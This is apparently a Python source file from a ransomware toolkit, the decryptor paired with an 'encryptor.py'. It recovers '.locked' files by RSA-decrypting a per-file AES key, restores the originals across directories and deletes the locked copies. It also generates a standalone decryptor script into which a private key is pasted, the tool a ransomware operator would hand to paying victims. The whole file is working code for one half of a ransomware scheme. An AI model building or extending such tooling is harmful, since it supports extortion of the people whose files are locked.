# -*- coding: utf-8 -*-
"""Ransomware decryptor -- Decrypt files encrypted by encryptor.py.

Author: zxwn
"""
import os, struct
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

EXTENSION_ENCRYPTED = ".locked"


def decrypt_file(filepath: str, private_key_pem: bytes) -> dict:
    """Decrypt single file encrypted with encryptor.py."""
    private_key = serialization.load_pem_private_key(
        private_key_pem, password=None, backend=default_backend()
    )

    with open(filepath, "rb") as f:
        # Read key length
        key_len = struct.unpack(">I", f.read(4))[0]
        encrypted_key = f.read(key_len)
        iv = f.read(16)
        ciphertext = f.read()

    # RSA decrypt AES key
    aes_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    # AES decrypt
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove PKCS7 padding
    pad_len = padded[-1]
    plaintext = padded[:-pad_len]

    # Write decrypted file
    original_path = filepath.replace(EXTENSION_ENCRYPTED, "")
    with open(original_path, "wb") as f:
        f.write(plaintext)

    os.unlink(filepath)

    return {"original": original_path, "size": len(plaintext)}


def decrypt_directory(path: str, private_key_pem: bytes) -> list:
    """Decrypt all .locked files in directory recursively."""
    results = []
    for root, dirs, files in os.walk(path):
        for fname in files:
            if fname.endswith(EXTENSION_ENCRYPTED):
                full_path = os.path.join(root, fname)
                try:
                    r = decrypt_file(full_path, private_key_pem)
                    results.append(r)
                except Exception as e:
                    results.append({"error": str(e), "file": full_path})
    return results


def generate_decryptor_stub() -> str:
    """Generate standalone decryptor script (user provides private key)."""
    return '''#!/usr/bin/env python3
"""Standalone decryptor -- provide your private key."""
import os, sys, struct
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

PRIVATE_KEY_PEM = b"""-----BEGIN PRIVATE KEY-----
<YOUR PRIVATE KEY HERE>
-----END PRIVATE KEY-----"""

def decrypt_file(filepath):
    private_key = serialization.load_pem_private_key(PRIVATE_KEY_PEM, password=None, backend=default_backend())
    with open(filepath, "rb") as f:
        key_len = struct.unpack(">I", f.read(4))[0]
        encrypted_key = f.read(key_len)
        iv = f.read(16)
        ciphertext = f.read()
    aes_key = private_key.decrypt(encrypted_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    plaintext = padded[:-padded[-1]]
    original = filepath.replace(".locked", "")
    with open(original, "wb") as f:
        f.write(plaintext)
    os.unlink(filepath)
    return original

if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "."
    for root, _, files in os.walk(path):
        for f in files:
            if f.endswith(".locked"):
                full = os.path.join(root, f)
                try:
                    orig = decrypt_file(full)
                    print(f"[OK] {orig}")
                except Exception as e:
                    print(f"[FAIL] {full}: {e}")
'''


if __name__ == "__main__":
    print("[decryptor] Loaded.")
